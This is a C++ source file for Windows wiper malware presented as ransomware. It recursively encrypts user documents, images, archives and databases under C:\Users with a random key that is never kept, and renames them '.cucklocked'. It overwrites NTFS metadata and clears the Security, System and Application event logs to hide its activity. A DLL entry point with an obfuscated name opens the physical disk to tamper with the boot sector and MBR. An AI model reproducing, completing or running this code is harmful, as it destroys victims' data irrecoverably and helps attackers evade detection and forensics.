#include <windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include "xts_aes.h"
#include "misc.h"

#pragma section(".text", execute, read, write)
#pragma code_seg(".text")

#pragma comment(lib, "ntdll.lib")

namespace fs = std::filesystem;

static const std::vector<std::string> target_exts = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".txt", ".pdf", ".jpg", ".png", ".zip", ".rar",
    ".7z", ".mp4", ".avi", ".db", ".sql"
};

static const std::vector<std::string> ntfs_meta = {
    "$MFT", "$LogFile", "$Bitmap", "$Boot"
};

// Filter for target files and NTFS metadata
inline bool is_target_file(const fs::path& file) {
    const std::string filename = file.filename().string();
    const std::string ext = file.extension().string();
    for (const auto& t : target_exts)
        if (_stricmp(ext.c_str(), t.c_str()) == 0) return true;
    for (const auto& m : ntfs_meta)
        if (filename.find(m) != std::string::npos) return true;
    return false;
}

// Encrypts buffer in-place using XTS-AES
inline void fast_xts_encrypt(std::vector<uint8_t>& buffer, xts_aes_context& xts_ctx) {
    const size_t block_size = 16;
    const size_t blocks = buffer.size() / block_size;
#pragma omp parallel for
    for (size_t i = 0; i < blocks; ++i) {
        xts_encrypt_block(&xts_ctx, &buffer[i * block_size], static_cast<uint64_t>(i));
    }
}

// Encrypts and renames target file
inline bool overwrite_and_rename(const fs::path& file_path, xts_aes_context& xts_ctx) {
    std::ifstream in(file_path, std::ios::binary);
    if (!in) return false;
    std::vector<uint8_t> data((std::istreambuf_iterator<char>(in)), {});
    in.close();

    fast_xts_encrypt(data, xts_ctx);

    std::ofstream out(file_path, std::ios::binary | std::ios::trunc);
    if (!out) return false;
    out.write(reinterpret_cast<char*>(data.data()), data.size());
    out.close();

    // Append ".cucklocked" extension
    std::error_code ec;
    fs::rename(file_path, file_path.string() + ".cucklocked", ec);
    return !ec;
}

// Recursively scan and encrypt user files
inline void scan_and_wipe(const fs::path& root, xts_aes_context& xts_ctx) {
    for (const auto& entry : fs::recursive_directory_iterator(root, std::filesystem::directory_options::skip_permission_denied)) {
        if (entry.is_regular_file() && is_target_file(entry.path())) {
            overwrite_and_rename(entry.path(), xts_ctx);
        }
    }
}

// Target and wipe NTFS system files
inline void wipe_ntfs_metadata(xts_aes_context& xts_ctx) {
    for (const auto& m : ntfs_meta) {
        fs::path system_file = fs::path("C:\\") / m;
        if (fs::exists(system_file)) {
            overwrite_and_rename(system_file, xts_ctx);
        }
    }
}

// Tracks removal and cleanup
inline void cover_tracks() {
    // Clear Windows Event Logs
    const char* logs[] = { "Security", "System", "Application" };
    for (auto log : logs) {
        HANDLE hEventLog = OpenEventLogA(NULL, log);
        if (hEventLog) {
            ClearEventLogA(hEventLog, NULL);
            CloseEventLog(hEventLog);
        }
    }

    // Delete files from temp directory
    TCHAR szTempPath[MAX_PATH];
    GetTempPath(MAX_PATH, szTempPath);
    fs::path temp_dir = szTempPath;
    for (const auto& entry : fs::recursive_directory_iterator(temp_dir, std::filesystem::directory_options::skip_permission_denied)) {
        try {
            fs::remove_all(entry.path());
        } catch (...) {}
    }

    // Wipe registry autorun keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WiperExecution");
        RegCloseKey(hKey);
    }

    // Clear sensitive memory (zeroing keyspace happens later)
}

// Entry point: main wiper logic
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    xts_aes_context xts_ctx;
    uint8_t key[32];
    HCRYPTPROV hProv;

    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, sizeof(key), key);
        CryptReleaseContext(hProv, 0);

        if (xts_set_key(&xts_ctx, key, sizeof(key))) {
            // Start scan on all user profiles
            scan_and_wipe("C:\\Users\\", xts_ctx);

            // Destroy metadata
            wipe_ntfs_metadata(xts_ctx);

            // Delete tracks/logs
            cover_tracks();
        }

        SecureZeroMemory(key, sizeof(key));
    }
    return 0;
}

// Persistent destructive payload on DLL load
HANDLE hHard = NULL;

BOOL APIENTRY ZuWQdweafdsg345312(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        hHard = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING, 0, NULL);

        if (hHard == INVALID_HANDLE_VALUE) {
            MessageBoxA(NULL, "Fatal Error - Cannot access disk", "FATAL ERROR", MB_ICONERROR);
            return FALSE;
        }

        // Payload sequence
        nsfwBackupMBR();             // (optional) Backup MBR
        nsfwFillEmptySectors();      // Junk wipe slack space
        nsfwConfigurationSector();   // Modify boot sector config
        nsfwInsertMicroKernel();     // Inject persistent microkernel

        CloseHandle(hHard);
    }
    return TRUE;
}
